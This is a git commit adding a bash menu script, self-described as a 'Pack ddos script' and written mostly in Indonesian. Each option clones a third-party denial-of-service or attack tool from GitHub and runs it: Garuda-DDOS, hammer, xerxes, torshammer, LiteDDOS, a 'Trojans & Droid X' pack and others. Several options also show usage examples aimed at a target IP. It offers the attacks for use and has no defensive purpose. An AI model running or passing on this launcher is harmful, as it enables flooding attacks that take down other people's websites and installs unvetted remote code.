97ae72197e3baf731ccbed307d67ede8d4c4afa3
Cx12 <56474039+Sixmusic807725@users.noreply.github.com>
2019-10-16 06:00:52 +0700

    Pack1

---
+++ Pack1.sh
@@ -0,0 +1,514 @@
+#!/bin/bash
+#Process Tools
+clear
+
+echo -e "∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞" | lolcat
+echo -e "«TUNGGU DAN LIAT LIST TOOLS YG ADA.........»" | lolcat
+echo -e "∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞" | lolcat
+
+sleep 2
+echo "\033[0;32m
+______________________
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+ ╔════════════╗
+    Mr.Six
+ ╚════════════╝
+  ║██████████╚╗
+  ║██╔══╗█╔═╗█║
+  ║██║╬╔╝█╚╗║█║
+  ║██╚═╝█║█╚╝█║
+  ╚╗█████████═╝
+     ╚╗║╠╩╩╩╩╩╝
+       ║║┈┈┈█▐█████▒.｡oO
+       ║██╠╦╦╦╗
+       ╚╗██████";
+
+sleep 2
+
+echo $cyan "««««««(Welcome to Pack ddos script)»»»»»"
+echo $blue "|Jenis Tools pack:Shell                                         |"
+echo $blue "|Pembuat:Mr.cx12                                                  |"
+echo $blue "|Contact: 62+812-2744-3846                            |"
+echo $blue "|Instagram: maxusgaming                                  |"
+echo $blue "|Sepecial Thanks to Allah SWT                          |"
+echo $cyan "««««««««««««(Indonesia)»»»»»»»»»»»»»»"
+echo ""
+echo $yellow "############[MENU]###############"
+echo ""
+echo ""
+
+sleep 1
+
+echo $cy "BERIKUT TOOLS PACK DDOS WEB NYA"
+
+sleep 1
+
+echo $g "『===========" | lolcat
+echo            "1.DDOS ATTACK" | lolcat
+echo $g "    ===========』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『===========" | lolcat
+echo            "2.Install G-Dork" | lolcat
+echo $g "    ===========』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『============" | lolcat
+echo            "3.Scan IP Website" | lolcat
+echo $g "    ============』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『=======" | lolcat
+echo            "4.Lacak IP" | lolcat
+echo $g "    =======』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『============" | lolcat
+echo            "5.Lucinta DDoS" | lolcat
+echo $g "    ============』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『=============" | lolcat
+echo            "6.Trojans & Droid X" | lolcat
+echo $g "    =============』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『=======" | lolcat
+echo            "7.Hammer" | lolcat
+echo $g "    =======』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『======" | lolcat
+echo            "8.Xerxes" | lolcat
+echo $g "    ======』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『==========" | lolcat
+echo            "9.Torshammer" | lolcat
+echo $g "    ==========』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『=========" | lolcat
+echo            "10.LiteDDOS" | lolcat
+echo $g "    =========』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『===========================" | lolcat
+echo            "11.DDOS SNIPER BLACKHAT TERSAKITI" | lolcat
+echo $g "    ===========================』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『===========" | lolcat
+echo            "12.Win32 attack" | lolcat
+echo $g "    ===========』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『=========" | lolcat
+echo            "13.DDOS BPC" | lolcat
+echo $g "    =========』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo $g "『=========" | lolcat
+echo            "00.Keluar/exit" | lolcat
+echo $g "    =========』" | lolcat
+
+sleep 0.1
+
+echo ""
+echo "Jika ada kesalahan atau crash hubungi ↓↓" | lolcat
+echo "WhatsApp: https://wa.me/6281227443846" | lolcat
+echo "Instagram: maxusgaming" | lolcat 
+echo "mohon maaf jika kurang atau salah mohon di maaf kan" | lolcat
+
+sleep 0.1
+
+
+echo $r"╭─[Select Number Of Tools:]"
+read -p "╰─root@SixTampans~# " pil
+
+if [ $pil = "1" ] || [ $pil = "01" ]
+then
+
+figlet -f slant DDOS A | lolcat
+
+sleep 1
+
+pkg install git python
+
+git clone https://github.com/Bl4ckDr460n/Garuda-DDOS
+
+cd Garuda-DDOS
+
+echo "python garuda.py -s [ip] -p 80 -t 135
+contoh" | lolcat
+
+fi
+
+if [ $pil = "2" ] || [ $pil = "02" ]
+then
+
+figlet -f slant G-Dork | lolcat
+
+sleep 1
+
+pkg install git python2
+ 
+pip2 install urllib2 urllib 
+
+git clone https://github.com/Bl4ckDr460n/G-Dork
+
+cd G-Dork
+
+python2 G-Dork.py
+
+echo "Inurl: dork nya" | lolcat
+echo "site:pilih domain nya contoh com,net,id" | lolcat
+echo "Max page:pilih jumlah contoh 30" | lolcat
+
+fi
+
+if [ $pil = "3" ] || [ $pil = "03" ]
+then
+
+figlet -f slant scanip | lolcat
+
+sleep 1
+
+pkg install git python2
+
+pip2 install requests socket
+
+git clone https://github.com/Bl4ckDr460n/ScanIp
+
+cd ScanIp
+
+python2 scanip.py
+
+fi
+
+if [ $pil = "4" ] || [ $pil = "04" ]
+then
+
+figlet -f slant Lacak | lolcat
+
+sleep 1
+
+pkg install git python2
+
+pip2 install requests 
+
+git clone https://github.com/Bl4ckDr460n/IP-Location
+
+cd IP-Location
+
+python2 lacak.py
+
+fi
+
+if [ $pil = "5" ] || [ $pil = "05" ]
+then
+
+figlet -f slant Lucita | lolcat
+
+sleep 1
+
+apt update && apt upgrade
+
+apt install python
+
+apt install git
+
+git clone https://github.com/zlucifer/lucita_ddos
+
+cd lucita_ddos
+
+chmod +x pukul.py
+
+python pukul.py
+
+fi
+
+if [ $pil = "6" ] || [ $pil = "06" ]
+then
+
+figlet -f slant T D | lolcat
+
+sleep 1
+
+apt update && apt upgrade
+
+apt install git toilet
+
+apt install python
+
+apt install python2
+
+git clone https://github.com/banghyuu/ddosWD
+
+cd ddosWD
+
+sh Ddos.sh
+
+fi
+
+if [ $pil = "7" ] || [ $pil = "07" ]
+then
+
+figlet -f slant Palu | lolcat
+
+sleep 1
+
+pkg update
+
+pkg upgrade
+
+pkg install python
+
+pkg install git
+
+git clone https://github.com/cyweb/hammer
+
+cd hammer
+
+chmod +x hammer.py
+
+python hammer.py
+
+echo "IKUTI CONTOH =⟩python3 hammer.py -s [IP target] -p [80] -t [135]" | lolcat
+
+fi
+
+if [ $pil = "8" ] || [ $pil = "08" ]
+then
+
+figlet -f slant Xerxes | lolcat
+
+sleep 1
+
+apt install git
+
+apt install clang
+
+git clone https://github.com/zanyarjamal/xerxes
+
+ls
+
+cd xerxes
+
+ls
+
+clang xerxes.c -o xerxes
+
+ls
+
+echo "IKUTI CONTOH =⟩ ./xerxes (nama website) 80" | lolcat
+
+fi
+
+if [ $pil = "9" ] || [ $pil = "09" ]
+then
+
+figlet -f slant T H | lolcat
+
+sleep 1
+
+pkg update
+
+pkg install git
+
+apt install tor
+
+pkg install python2
+
+git clone https://github.com/dotfighter/torshammer.git
+
+ls
+cd torshammer
+
+chmod +x torshammer.oy
+
+python2 torshammer.py
+
+fi
+
+if [ $pil = "10" ]
+then
+
+figlet -f slant L D | lolcat
+
+sleep 1
+
+apt update
+
+apt upgrade
+
+pkg install git
+
+pkg install python2
+
+git clone https://github.com/4L13199/LITEDDOS
+
+cd LITEDDOS
+
+chmod +x liteDDOS.py
+
+python2 liteDDOS.py
+
+fi
+
+if [ $pil = "11" ]
+then
+
+figlet -f slant DSBT | lolcat
+
+sleep 1
+
+apt update && apt upgrade
+
+apt install python
+
+apt install python2
+
+apt install git
+
+git clone https://github.com/MrTamfanX/MCIDDOS
+
+cd MCIDDOS
+
+ls 
+python2 TamfanDdos.py
+
+echo  $blue "python2 TamfanDdos.py [IP Target] [8080] [100000]"
+
+fi 
+
+if [ $pil = "12" ]
+then
+
+figlet -f slant W32 A | lolcat
+
+sleep 1
+
+apt install git
+
+apt install python
+
+apt install bash
+
+apt install toilet
+
+apt install lolcat
+
+git clone https://github.com/BPCATTACKER/DOS-TOOKITS
+
+cd DOS-TOOKITS
+
+sh DoS-TOOKIT.sh
+
+fi
+
+if [ $pil = "13" ]
+then
+
+figlet -f slant BPC | lolcat
+
+sleep 1
+
+git clone http://github.com/BLACK-PHANTOM-CYBER/DDOS-BPC/
+
+cd DDOS-BPC
+
+python2 SPOONDDOS.sh
+
+fi
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
